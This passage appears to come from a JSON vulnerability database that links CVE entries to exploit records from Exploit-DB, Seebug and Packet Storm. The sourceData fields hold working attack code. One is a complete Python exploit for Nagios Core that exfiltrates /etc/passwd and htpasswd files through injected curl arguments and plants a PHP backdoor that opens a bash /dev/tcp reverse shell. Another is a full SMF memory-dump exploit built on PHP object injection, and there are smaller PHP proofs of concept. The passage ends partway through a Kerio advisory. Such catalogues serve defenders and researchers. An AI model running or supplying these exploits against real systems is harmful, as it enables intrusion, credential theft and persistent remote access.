            "sourceData": "source: http://www.securityfocus.com/bid/46975/info\r\n\r\nPHP is prone to a remote denial-of-service vulnerability that affects the 'Zip' extension.\r\n\r\nSuccessful attacks will cause the application to crash, creating a denial-of-service condition. Due to the nature of this issue, arbitrary code-execution may be possible; however, this has not been confirmed.\r\n\r\nVersions prior to PHP 5.3.6 are vulnerable. \r\n\r\n<?php\r\n$o = new ZipArchive();\r\nif (! $o->open('test.zip',ZipArchive::CHECKCONS)) {\r\n\texit ('error can\\'t open');\r\n}\r\n$o->getStream('file2'); // this file is ok\r\necho \"OK\";\r\n$r = $o->getStream('file1'); // this file has a wrong crc\r\nwhile (! feof($r)) {\r\n\tfread($r,1024);\r\n}\r\necho \"never here\\n\";\r\n?>\r\n",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:35485"
        }
    ],
    "CVE-2011-1398": [
        {
            "bulletinFamily": "exploit",
            "description": "PHP 'header()' HTTP Header Injection Vulnerability. CVE-2011-1398. Remote exploit for php platform",
            "modified": "2011-10-06T00:00:00",
            "published": "2011-10-06T00:00:00",
            "id": "EDB-ID:37688",
            "href": "https://www.exploit-db.com/exploits/37688/",
            "type": "exploitdb",
            "title": "PHP 'header' HTTP Header Injection Vulnerability",
            "sourceData": "source: http://www.securityfocus.com/bid/55297/info\r\n\r\nPHP is prone to a vulnerability that allows attackers to inject arbitrary headers through a URL.\r\n\r\nBy inserting arbitrary headers, attackers may be able to launch cross-site request-forgery, cross-site scripting, HTML-injection, and other attacks.\r\n\r\nPHP 5.1.2 is vulnerable; other versions may also be affected. \r\n\r\n<?php\r\nheader('Location: '.$_GET['url']);\r\nprint_r($_COOKIE);\r\n?>\r\n\r\nhttp://www.example.com/head1.php?url=http://example.com/head1.php%0DSet-Cookie:+NAME=foo ",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:37688"
        }
    ],
    "CVE-2013-1824": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 62373\r\nCVE(CAN) ID: CVE-2013-1824\r\n\r\nPHP\u662f\u4e00\u79cdHTML\u5185\u5d4c\u5f0f\u7684\u8bed\u8a00\u3002\r\n\r\nPHP 5.3.22\u30015.4.13\u4e4b\u524d\u7248\u672c\u5b58\u5728\u591a\u4e2a\u4efb\u610f\u6587\u4ef6\u6cc4\u9732\u6f0f\u6d1e\uff0c\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\u67e5\u770b\u53d7\u5f71\u54cd\u5e94\u7528\u5185\u7684\u4efb\u610f\u6587\u4ef6\u3002\n0\nPHP 5.4.1\r\nPHP 5.3.13\r\nPHP 5.3.12\r\nPHP 5.3.11\r\nPHP 5.3.10\r\nPHP 5.3.1\r\nPHP 5.3\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.php.net/downloads.php",
            "modified": "2013-09-18T00:00:00",
            "published": "2013-09-18T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-61028",
            "id": "SSV:61028",
            "type": "seebug",
            "title": "PHP 'ext/soap/php_xml.c'\u4e0d\u5b8c\u6574\u4fee\u590d\u591a\u4e2a\u4efb\u610f\u6587\u4ef6\u6cc4\u9732\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:61028"
        }
    ],
    "CVE-2010-4156": [
        {
            "bulletinFamily": "exploit",
            "description": "PHP 5.3.x 'mb_strcut()' Function Information Disclosure Vulnerability. CVE-2010-4156 . Remote exploit for php platform",
            "modified": "2010-11-07T00:00:00",
            "published": "2010-11-07T00:00:00",
            "id": "EDB-ID:34979",
            "href": "https://www.exploit-db.com/exploits/34979/",
            "type": "exploitdb",
            "title": "PHP 5.3.x - 'mb_strcut' Function Information Disclosure Vulnerability",
            "sourceData": "source:  http://www.securityfocus.com/bid/44727/info\r\n\r\nPHP is prone to an information-disclosure vulnerability.\r\n\r\nAttackers can exploit this issue to obtain sensitive information that may lead to further attacks. \r\n\r\n<?php\r\n$b = \"bbbbbbbbbbb\";\r\nstr_repeat(\"THIS IS A SECRET MESSAGE, ISN'T IT?\", 1);\r\n$var3 = mb_strcut($b, 0, 1000);\r\necho $var3;\r\n?> ",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:34979"
        }
    ],
    "CVE-2015-4642": [
        {
            "bulletinFamily": "exploit",
            "description": "**Author: p0wd3r, dawu (know Chong Yu 404 security lab)**\n\n**Date: 2016-12-15**\n\n## 0x00 vulnerability overview\n\n### 1\\. Vulnerability description\n\n[Nagios ](<https://www.nagios.org>) is a monitoring of the IT infrastructure program, recently security researchers [Dawid Golunski ](<http://legalhackers.com/>) discovered in [Nagios Core ](<https://www.nagios.org/projects/nagios-core/>) there is a code execution vulnerability: an attacker first in the disguise of RSS feeds, when victimization the app to get the RSS information when the attacker would construct a malicious data to the victim, the program in the process will be the malicious data is injected into the curl command, and then code execution.\n\n### 2\\. Vulnerability\n\nThe vulnerability is triggered premise:\n\n  1. The attacker can be disguised as `https://www.nagios.org `using dns spoofing and other methods\n  2. The attacker is authorized, or an attacker convinces an authorized user to access `rss-corefeed.php `and `rss-newsfeed.php `and `rss-corebanner.php `one of the files.\n\nA successful attack execute arbitrary code.\n\n### 3\\. Impact version\n\nNagios Core &lt; 4.2.2\n\n## 0x01 vulnerability reproduction\n\n### 1\\. Environment to build\n\nDockerfile:\n\n``dockerfile FROM quantumobject/docker-nagios\n\nRUN sed-i '99d' /usr/local/nagios/share/includes/rss/rss_fetch. inc\n\nRUN mkdir /tmp/tmp &amp;&amp; chown www-data:www-data /tmp/tmp ``\n\nThen run:\n\n`bash docker run-p 80:80 --name nagios-d quantumobject/docker-nagios`\n\nAccess `http://127.0.0.1/nagios `with `nagiosadmin:admin `log in\n\n### 2\\. Vulnerability analysis\n\nVulnerability trigger point in`/usr/local/nagios/share/includes/rss/extlib/Snoopy. class. inc `the 657 line, the`_httpsrequest `function:\n\n``php // version &lt; 4.2.0 exec($this-&gt;curl_path.\" -D \\\"/tmp/$headerfile\\\"\". escapeshellcmd($cmdline_params).\" \". escapeshellcmd($URI),$results,$return);\n\n// vserion &gt;= 4.2.0 &amp;&amp; version &lt; 4.2.2 exec($this-&gt;curl_path.\" -D \\\"/tmp/$headerfile\\\"\".$ cmdline_params.\" \\\"\". escapeshellcmd($URI).\"\\\"\",$ results,$return); ``\n\nWhere the use of the `escapeshellcmd `to the **command parameter **processing, `escapeshellcmd `of the role are as follows:\n\n![Alt text](https://images.seebug.org/content/images/2016/12/escapeshellcmd.png)\n\nThe author is intended to prevent multiple execution of the command, but this treatment did not prevent the implantation **of a plurality of parameter **samples if the`$URI `controlled, and then with the `curl `of some characteristics can read and write files, and then code execution. \uff08In General to prevent the injection of a plurality of parameters you want to use [escapeshellarg](<http://php.net/manual/zh/function.escapeshellarg.php>), but the function is not absolute security, as detailed in [CVE-2015-4642 ](<https://bugs.php.net/bug.php?id=69646>)it.\n\nBecause before the burst of the [CVE-2008-4796](<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4796>), the code in the 4. 2. 0 version did change, but the patch can be bypassed, as long as we are in the input closed before and after`\"`.\n\nBelow we look at`$URI `whether controllable. According to the code logic point of view,`_httpsrequet `is `usr/local/nagios/share/includes/rss/rss_fetch. inc `in the `fetch_rss `function call, so that we create such a test file `test.php `to:\n\n``php &lt;? php define('MAGPIE_DIR', './ includes/rss/'); define('MAGPIE_CACHE_ON', 0); define('MAGPIE_CACHE_AGE', 0); define('MAGPIE_CACHE_DIR', '/tmp/magpie_cache'); require_once(MAGPIE_DIR.'rss_fetch. inc');\n\nfetch_rss('https://www.baidu.com --version'); ``\n\nAccess `http://127.0.0.1/nagios/test.php `after turn on dynamic debugging, we in the `exec `function at the lower breakpoint, the call stack is as follows:\n\n![Alt text](https://images.seebug.org/content/images/2016/12/req-call.png)\n\n`$URI `as follows:\n\n![Alt text](https://images.seebug.org/content/images/2016/12/uri-control.png)\n\nShows the`$URI `controlled, and in the incoming process has not been filtered.\n\nNext we need to construct `the curl `parameters to get the results we want, here we use Dawid Golunski provide the [Exp](<https://github.com/0xwindows/VulScritp/blob/master/nagios/nagios_cmd_injection.py>), it is noted that he provided the code to verify that 4. 2. 0 before version to verify the version greater than or equal to 4. 2. 0 and less than 4. 2. 2, The need for which code is about to change, coupled with the closure needed to double the quotes:\n\n``python\n\n# Line 44\n\nself. redirect('https://' + self. request. host + '/nagioshack\" -Fpasswd=@/etc/passwd-Fgroup=@/etc/group-Fhtauth=@/usr/local/nagios/etc/htpasswd.users --trace-ascii ' + backdoor_path + '\"', permanent=False) `` \n\nThe Exp of the specific process is as follows:\n\n  1. The attacker on the server to open a http/https Server\n  2. Victims using `fetch_rss `to the server to send its request\n  3. The attacker receives the request to redirect, redirect url to `https:// + the attacker's server + payload`, the payload in the use`-F `the file content is sent to the server, the`--trace-ascii `will flow records to the file, similar to Roundcube RCE in the `mail `function of`-X `is.\n  4. The server receives the redirected request after the following three operations:\n    1. Parse the file content\n    2. Return to the back door content and then through the flow record is written to the backdoor file\n    3. Returns the constructed XML in the `description`, add`<img src=backdoor.php>`\n  5. Victims parse the XML and the `description `of the contents of the output to html, and then automatically performs back door\n\nIn order to facilitate verification, we are in the website directory create a `exp.php`:\n\n``php &lt;? php define('MAGPIE_DIR', './ includes/rss/'); define('MAGPIE_CACHE_ON', 0); define('MAGPIE_CACHE_AGE', 0); define('MAGPIE_CACHE_DIR', '/tmp/magpie_cache'); require_once(MAGPIE_DIR.'rss_fetch. inc');\n\nfetch_rss('http://172.17.0.3'); ``\n\nOnly for validation vulnerability, where we don't have to parse the XML and then we `172.17.0.3 `run on Exp, and then access the `http://127.0.0.1/exp.php `you can get the results:\n\n![Alt text](https://images.seebug.org/content/images/2016/12/exp.png)\n\nThe actual testing Exp in back door code is possible in the log will be truncated resulting in command execution is unsuccessful, recommended to write a brief word:\n\n![Alt text](https://images.seebug.org/content/images/2016/12/backdoor.png)\n\nThe real case, the `fetch_rss `call as follows:\n\n![Alt text](https://images.seebug.org/content/images/2016/12/req-call-1.png)\n\nVisible we can not control the values of the parameters, it can only be by dns spoofing and other means to make the target of the `https://www.nagios.org `the access point to the attacker's server, and then trigger the vulnerability.\n\n### 3\\. Patch analysis\n\n4.2.2 version, deleted `the includes/`and `rss-corefeed.php `and `rss-newsfeed.php `and `rss-corebanner.php `the.\n\n## 0x02 repair program\n\nUpgrade to 4. 2. 2\n\n## 0x03 reference\n\n  1. Dawid Golunski vulnerability report: <http://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html>\n  2. `escapeshellcmd `use manual: <http://php.net/manual/zh/function.escapeshellcmd.php>\n",
            "modified": "2016-12-14T00:00:00",
            "published": "2016-12-14T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-92573",
            "id": "SSV:92573",
            "type": "seebug",
            "title": "Nagios Core < 4.2.2 Curl Command Injection/Code Execution \uff08CVE-2016-9565\uff09",
            "sourceData": "\n                                                \"\"\"\r\nThis PoC exploit can allow well-positioned attackers to extract and write \r\narbitrary files on the Nagios server which can lead to arbitrary code execution\r\non Nagios deployments that follow the official Nagios installation guidelines. \r\nFor details, see the full advisory at:\r\nhttps://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html\r\nPoC Video:\r\nhttps://legalhackers.com/videos/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html\r\nUsage:\r\n./nagios_cmd_injection.py reverse_shell_ip [reverse_shell_port]\r\nDisclaimer:\r\nFor testing purposes only. Do no harm.\r\n\"\"\"\r\n\r\nimport os\r\nimport sys\r\nimport time\r\nimport re\r\nimport tornado.httpserver\r\nimport tornado.web\r\nimport tornado.ioloop\r\n\r\nexploited  = 0 \r\ndocroot_rw = 0\r\n\r\nclass MainHandler(tornado.web.RequestHandler):\r\n\r\n    def get(self):\r\n\tglobal exploited\r\n\tif (exploited == 1):\r\n\t\tself.finish()\r\n\telse:\r\n\t\tua  = self.request.headers['User-Agent']\r\n\t\tif \"Magpie\" in ua:\r\n\t\t\tprint \"[+] Received GET request from Nagios server (%s) ! Sending redirect to inject our curl payload:\\n\" % self.request.remote_ip\r\n\t\t\tprint  '-Fpasswd=@/etc/passwd -Fgroup=@/etc/group -Fhtauth=@/usr/local/nagios/etc/htpasswd.users --trace-ascii ' + backdoor_path + '\\n'\r\n\t\t\tself.redirect('https://' + self.request.host + '/nagioshack -Fpasswd=@/etc/passwd -Fgroup=@/etc/group -Fhtauth=@/usr/local/nagios/etc/htpasswd.users --trace-ascii ' + backdoor_path, permanent=False)\r\n\t\t\texploited = 1\r\n\r\n    def post(self):        \r\n        global docroot_rw\r\n\tprint \"[+] Success, curl payload injected! Received data back from the Nagios server %s\\n\" % self.request.remote_ip\r\n\r\n\t# Extract /etc/passwd from the target \r\n        passwd = self.request.files['passwd'][0]['body']\r\n\tprint \"[*] Contents of /etc/passwd file from the target:\\n\\n%s\" % passwd\r\n\r\n\t# Extract /usr/local/nagios/etc/htpasswd.users\r\n        htauth = self.request.files['htauth'][0]['body']\r\n\tprint \"[*] Contents of /usr/local/nagios/etc/htpasswd.users file:\\n\\n%s\" % htauth\r\n\r\n\t# Extract nagios group from /etc/group\r\n        group = self.request.files['group'][0]['body']\r\n\tfor line in group.splitlines():\r\n\t    if \"nagios:\" in line:\r\n\t\tnagios_group = line\r\n\t\tprint \"[*] Retrieved nagios group line from /etc/group file on the target: %s\\n\" % nagios_group\r\n\tif \"www-data\" in nagios_group:\r\n\t\tprint \"[+] Happy days, 'www-data' user belongs to 'nagios' group! (meaning writable webroot)\\n\"\r\n\t\tdocroot_rw = 1\r\n\r\n\t# Put backdoor PHP payload within the 'Server' response header so that it gets properly saved via the curl 'trace-ascii'\r\n\t# option. The output trace should contain  an unwrapped line similar to:\r\n\t# \r\n\t# == Info: Server <?php system(\"/bin/bash -c 'nohup bash -i >/dev/tcp/192.168.57.3/8080 0<&1 2>&1 &'\"); ?> is not blacklisted\r\n\t#\r\n\t# which will do the trick as it won't mess up the payload :)\r\n\tself.add_header('Server', backdoor)\r\n\r\n\t# Return XML/feed with JavaScript payload that will run the backdoor code from nagios-backdoor.php via <img src=> tag :)\r\n\tprint \"[*] Feed XML with JS payload returned to the client in the response. This should load nagios-backdoor.php in no time :) \\n\"\r\n\tself.write(xmldata)\r\n\r\n\tself.finish()\r\n\ttornado.ioloop.IOLoop.instance().stop()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    global backdoor_path\r\n    global backdoor\r\n\r\n    print intro\r\n\r\n    # Set attacker's external IP & port to be used by the reverse shell\r\n    if len(sys.argv) < 2 :\r\n\t   print usage\r\n\t   sys.exit(2)\r\n    attacker_ip   = sys.argv[1]\r\n    if len(sys.argv) == 3 :\r\n\t   attacker_port = sys.argv[1]\r\n    else:\r\n\t   attacker_port = 8080\r\n\r\n    # PHP backdoor to be saved on the target Nagios server\r\n    backdoor_path = '/usr/local/nagios/share/nagios-backdoor.php'\r\n    backdoor = \"\"\"<?php system(\"/bin/bash -c 'nohup bash -i >/dev/tcp/%s/%s 0<&1 2>&1 &'\"); die(\"stop processing\"); ?>\"\"\" % (attacker_ip, attacker_port)\r\n\r\n    # Feed XML containing JavaScript payload that will load the nagios-backdoor.php script\r\n    global xmldata\r\n    xmldata = \"\"\"<?xml version=\"1.0\"?>\r\n    <rss version=\"2.0\">\r\n          <channel>\r\n            <title>Nagios feed with injected JS payload</title>\r\n            <item>\r\n              <title>Item 1</title>\r\n              <description>\r\n                &lt;strong&gt;Feed injected. Here we go &lt;/strong&gt; - \r\n                loading /nagios/nagios-backdoor.php now via img tag... check your netcat listener for nagios shell ;) \r\n                &lt;img src=&quot;/nagios/nagios-backdoor.php&quot; onerror=&quot;alert('Reverse Shell /nagios/nagios-backdoor.php executed!')&quot;&gt;\r\n              </description>\r\n            </item>\r\n          </channel>\r\n    </rss> \"\"\"\r\n\r\n\r\n    # Generate SSL cert\r\n    print \"[+] Generating SSL certificate for our python HTTPS web server \\n\"\r\n    os.system(\"echo -e '\\n\\n\\n\\n\\n\\n\\n\\n\\n' | openssl req  -nodes -new -x509  -keyout server.key -out server.cert 2>/dev/null\")\r\n\r\n    print \"[+] Starting the web server on ports 80 & 443 \\n\"\r\n    application = tornado.web.Application([\r\n        (r'/.*', MainHandler)\r\n    ])\r\n    application.listen(80)\r\n    http_server = tornado.httpserver.HTTPServer(\r\n        application, \r\n        ssl_options = {\r\n            \"certfile\": os.path.join(\"./\", \"server.cert\"),\r\n            \"keyfile\": os.path.join(\"./\", \"server.key\"),\r\n        }\r\n    )\r\n    http_server.listen(443)\r\n\r\n    print \"[+] Web server ready for connection from Nagios (http://target-svr/nagios/rss-corefeed.php). Time for your dnsspoof magic... ;)\\n\"\r\n    tornado.ioloop.IOLoop.current().start()\r\n\r\n    if (docroot_rw == 1):\r\n\t    print \"[+] PHP backdoor should have been saved in %s on the target by now!\\n\" % backdoor_path\r\n\t    print \"[*] Spawning netcat and waiting for the nagios shell\\n\"\r\n\t    os.system(\"nc -v -l -p 8080\")\r\n\t    print \"\\n[+] Shell closed\\n\"\r\n\r\n    print \"[+] That's all. Exiting\\n\"\n                              ",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:92573"
        }
    ],
    "CVE-2015-4148": [
        {
            "bulletinFamily": "exploit",
            "description": "SMF (Simple Machine Forum) <= 2.0.10 - Remote Memory Exfiltration Exploit. CVE-2015-4148. Webapps exploit for php platform",
            "modified": "2015-09-24T00:00:00",
            "published": "2015-09-24T00:00:00",
            "id": "EDB-ID:38304",
            "href": "https://www.exploit-db.com/exploits/38304/",
            "type": "exploitdb",
            "title": "SMF Simple Machine Forum <= 2.0.10 - Remote Memory Exfiltration Exploit",
            "sourceData": "#!/usr/bin/python\r\n# -*- coding: iso-8859-15 -*-\r\n\r\n#############################################################################\r\n# Title:    \tSMF (Simple Machine Forum) <= 2.0.10 Remote Memory Exfiltration Exploit\r\n# Authors:  \tAndrea Palazzo  \r\n#\t\t\t\t\t<andrea [dot] palazzo [at] truel [dot] it> \r\n#           \tFilippo Roncari \r\n#\t\t\t\t\t<filippo [dot] roncari [at] truel [dot] it>\r\n#           \tTruel Lab ~ http://lab.truel.it\r\n# Requirements:\tSMF <= 2.0.10\r\n#\t\t\t\tPHP <= 5.6.11 / 5.5.27 / 5.4.43\r\n# Advisories:\tTL-2015-PHP04 http://lab.truel.it/d/advisories/TL-2015-PHP04.txt\r\n#\t\t\t\tTL-2015-PHP06 http://lab.truel.it/d/advisories/TL-2015-PHP06.txt\r\n#\t\t\t\tTL-2015-SMF01 n/y/a\r\n# Details:\t\thttp://lab.truel.it/2015/09/php-object-injection-the-dirty-way/\r\n# Demo: \t\thttps://www.youtube.com/watch?v=dNRXTt7XQxs\r\n############################################################################\r\n\r\n\r\nimport sys, requests, time, os, socket, thread, base64, string, urllib\r\nfrom multiprocessing import Process\r\n\r\n#Payload Config\r\nbytes_num = 000 #num of bytes to dump\r\naddress = 000 #starting memory address\r\n\r\n#Target Config\r\ncookie = {'PHPSESSID' : '000'} #SMF session cookie\r\ntarget_host = 'http://localhost/smf/index.php' #URL of target installation index.php\r\ncsrftoken = ''\r\n\r\n#Local Server Config\r\nhost = \"localhost\"\r\nport = 31337\r\n\r\n#Memory dump variables \r\ndumped = ''\r\ncurrent_dump = ''\r\nin_string = False\r\nbrute_index = 0\r\nbrute_list = list(string.ascii_letters + string.digits)\r\nr_ok = 'HTTP/1.0 200 OK' + '\\n'\r\nr_re = 'HTTP/1.0 302 OK' + '\\n'\r\nr_body = '''Server: Truel-Server\r\nContent-Type: text/xml\r\nConnection: keep-alive\r\nContent-Length: 395\r\n\r\n<env:Envelope xmlns:env=\"http://www.w3.org/2003/05/soap-envelope\">\r\n <env:Header>\r\n  <n:alertcontrol xmlns:n=\"http://example.org/alertcontrol\">\r\n   <n:priority>1</n:priority>\r\n   <n:expires>2001-06-22T14:00:00-05:00</n:expires>\r\n  </n:alertcontrol>\r\n </env:Header>\r\n <env:Body>\r\n  <m:alert xmlns:m=\"http://example.org/alert\">\r\n   <m:msg>Truel</m:msg>\r\n  </m:alert>\r\n </env:Body>\r\n</env:Envelope>'''\r\n\r\n\r\ndef serverStart():\r\n\tprint \"[+] Setting up local server on port \" + str(port)\r\n\tsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n\tsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n\tif not sock:\r\n\t\tprint \"[X] Fatal Error: Unable to create socket\"\r\n\tsock.bind((host, port))\r\n\tsock.listen(1) \r\n\treturn sock\r\n\r\ndef getToken():\r\n\tglobal csrftoken\r\n\tprint \"[+] Trying to get a valid CSRF token\"\r\n\tfor n in range(3): #3 attempts\r\n\t\tr = requests.get(target_host, cookies=cookie, allow_redirects=False)\r\n\t\tr = r.text\r\n\t\tif(r.find(\"action=logout;\")!=-1):\r\n\t\t\tbreak\r\n\tstart = r.find(\"action=logout;\")\r\n\tif (start !=-1):\r\n\t\tend = (r[start+14:]).find('\">')\r\n\t\tcsrftoken = r[start+14 : start+end+14]\r\n\t\tprint \"[+] Authentication done. Got token \" + str(csrftoken)\r\n\t\treturn True\r\n\telse:\r\n\t\tprint \"[X] Fatal Error: You are not authenticated. Check the provided PHPSESSID.\"\r\n\t\treturn False\r\n\r\ndef prepareForExploit():\r\n\tif not(getToken()): #get CSRF token\r\n\t\tos._exit(1)\r\n\ttarget = target_host + '?action=suggest&' + csrftoken + '&search_param=test' \r\n \tr = requests.get(target, cookies=cookie, allow_redirects=False) #necessary request\r\n \treturn\r\n\r\ndef forgePayload(current_try, address):\r\n\tlocation = \"http://\" + current_try\r\n\tpayload = 'O:12:\"DateInterval\":1:{s:14:\"special_amount\";O:9:\"Exception\":1:{s:19:\"\\x00Exception\\x00previous\";O:10:\"SoapClient\":5:{s:3:\"uri\";s:1:\"a\";s:8:\"location\";s:' + str(len(location)) + ':\"' + location + '\";s:8:\"_cookies\";a:1:{s:5:\"owned\";a:3:{i:0;s:1:\"a\";i:2;i:' + str(address) + ';i:1;i:' + str(address) + ';}}s:11:\"_proxy_host\";s:' + str(len(host)) + ':\"' + str(host) + '\";s:11:\"_proxy_port\";i:' + str(port) + ';}}}'\r\n\treturn payload\r\n\r\ndef sendPayload(payload,null):\r\n \ttarget = target_host + '?action=suggest&' + csrftoken + '&search_param=' + (base64.b64encode(payload)) #where injection happens\r\n \ttry:\r\n\t\tr = requests.get(target, cookies=cookie, allow_redirects=False)\r\n\texcept requests.exceptions.RequestException:    \r\n\t\tprint \"[X] Fatal Error: Unable to reach the remote host (Connection Refuse)\"\r\n\t\tos._exit(1) \r\n\treturn \r\n\r\ndef limitReached(dumped):\r\n\tif(len(dumped) >= bytes_num):\r\n\t\treturn True\r\n\telse:\r\n\t\treturn False\r\n\r\ndef printDumped(dumped):\r\n\td = \"    \"\r\n\tcnt = 1\r\n\tprint \"[+] \" + str(len(dumped)) + \" bytes dumped from \" + target_host\r\n\tprint \"[+] ======================= Dumped Data =======================\"\r\n\tfor i in range(bytes_num):\r\n\t\td = d + str(dumped[i])\r\n\t\tif (cnt % 48 == 0):\r\n\t\t\tprint d \r\n\t\t\td = \"    \"\r\n\t\tif (cnt == bytes_num):\r\n\t\t\tprint d\r\n\t\tcnt = cnt + 1\r\n\r\ndef getSoapRequest(sock):\r\n\tconnection, sender = sock.accept()\r\n\trequest = connection.recv(8192) \r\n\treturn (connection, request)\r\n\r\ndef sendSoapResponse(connection, content):\r\n\tconnection.send(content)\r\n\tconnection.close()\r\n\treturn\r\n\r\ndef getDumpedFromHost(request):\r\n\ti = request.find(\"Host: \") + 6\r\n\tv = request[i:i+1]\r\n\treturn v\r\n\r\ndef pushDumped(value, string):\r\n\tglobal dumped\r\n\tglobal current_dump\r\n\tglobal brute_index\r\n\tglobal address\r\n\tglobal in_string\r\n\r\n\tdumped = str(value) + str(dumped) \r\n\tif(string):\r\n\t\tcurrent_dump = str(value) + str(current_dump)\r\n\telse:\r\n\t\tcurrent_dump = \"\"\r\n\tin_string = string\r\n\taddress = address-1\r\n\tbrute_index = 0\r\n\tprint \"[\" + hex(address) + \"] \" + str(value)\r\n\treturn\r\n\r\ndef bruteViaResponse(sock):\r\n\tglobal brute_index\r\n\tcurrent_try = \"\"\r\n\tresponse_ok = r_ok + r_body\r\n\r\n\tfor n in range(19):\r\n\t\tconnection, request = getSoapRequest(sock)\r\n\t\tif not request:\r\n\t\t\tconnection.close()\r\n\t\t\treturn False\r\n\t\tif request.find(\"owned\")!=-1:\r\n\t\t\tpushDumped(getDumpedFromHost(request), True)\r\n\t\t\tsendSoapResponse(connection,response_ok)\r\n\t\t\treturn True\r\n\t\telse:\r\n\t\t\tif((brute_index+1) == len(brute_list)):\r\n\t\t\t\tsendSoapResponse(connection,response_ok)\r\n\t\t\t\treturn False\r\n\t\t\tbrute_index = brute_index + 1\r\n\t\tif not in_string:\r\n\t\t\tcurrent_try = brute_list[brute_index]\r\n\t\telse:\r\n\t\t\tcurrent_try = brute_list[brute_index] + str(current_dump)\r\n\t\tresponse_re = r_re + 'Location: http://' + str(current_try) + '\\n' + r_body\r\n\t\tsendSoapResponse(connection,response_re)\r\n\tconnection, request = getSoapRequest(sock)\r\n\tif request.find(\"owned\")!=-1:\r\n\t\tpushDumped(getDumpedFromHost(request), True)\r\n\t\tsendSoapResponse(connection,response_ok)\r\n\t\treturn True\r\n\tsendSoapResponse(connection,response_ok)\r\n\treturn False\r\n\r\ndef bruteViaRequest(sock):\r\n\tglobal brute_index\r\n\tbrute_index = 0\r\n\tcurrent_try = \"\"\r\n\r\n\twhile(True):\t\r\n\t\tif(brute_index == len(brute_list)):\r\n\t\t\tpushDumped(\".\", False)\r\n\t\tif limitReached(dumped):\r\n\t\t\tprintDumped(dumped)\r\n\t\t\treturn \r\n\t\tif not in_string:\r\n\t\t\tcurrent_try = brute_list[brute_index]\r\n\t\telse:\r\n\t\t\tcurrent_try = brute_list[brute_index] + str(current_dump)\r\n\t\tpayload = forgePayload(current_try,address)\r\n\t\tthread.start_new_thread(sendPayload,(payload,\"\"))\r\n\t\tif not bruteViaResponse(sock):\r\n\t\t\tbrute_index = brute_index + 1\r\n\treturn  \r\n\r\ndef runExploit():\r\n\tprint \"[+] Starting exploit\"\r\n\tsock = serverStart()\r\n\tprepareForExploit()\r\n\tprint \"[+] Trying to dump \" + str(bytes_num) + \" bytes from \" + str(target_host)\r\n\tbruteViaRequest(sock)\r\n\tsock.close()\r\n\tprint \"[+] Bye ~ Truel Lab (http://lab.truel.it)\"\r\n\tsys.exit(0)\r\n\r\n\r\nrunExploit()\r\n",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:38304"
        }
    ],
    "CVE-2015-6834": [
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2016-09-22T00:00:00",
            "published": "2016-09-22T00:00:00",
            "href": "https://packetstormsecurity.com/files/138812/Kerio-Control-Unified-Threat-Management-Code-Execution-XSS-Memory-Corruption.html",
            "id": "PACKETSTORM:138812",
            "type": "packetstorm",
            "title": "Kerio Control Unified Threat Management Code Execution / XSS / Memory Corruption",
            "sourceData": "`SEC Consult has also released a blog post describing the attack scenarios  \nof the vulnerabilities within this advisory in detail and a video which  \nshows the remote attack. Exploit code has been developed as well but will  \nnot be released for now.  \n  \nBlog:  \nhttp://blog.sec-consult.com/2016/09/controlling-kerio-control-when-your.html  \n  \nVideo:  \nhttps://www.youtube.com/watch?v=y_OWz25sHMI  \n  \n  \nSEC Consult Vulnerability Lab Security Advisory < 20160922-0 >  \n=======================================================================  \ntitle: Potential backdoor access through multiple vulnerabilities  \nproduct: Kerio Control Unified Threat Management  \nvulnerable version: <9.1.3, verified in version 9.1.0 build 1087 and 9.1.1  \nbuild 1324  \nfixed version: 9.1.3 (partially fixed, see vendor statement below)  \nCVE number: -  \nimpact: critical  \nhomepage: http://www.kerio.com/  \nfound: 2016-08-24  \nby: R. Freingruber (Office Vienna)  \nR. Tavakoli (Office Vienna)  \nSEC Consult Vulnerability Lab  \n  \nAn integrated part of SEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nhttps://www.sec-consult.com  \n  \n=======================================================================  \n  \nVendor description:  \n-------------------  \n\"Protect your network from viruses, malware and malicious activity  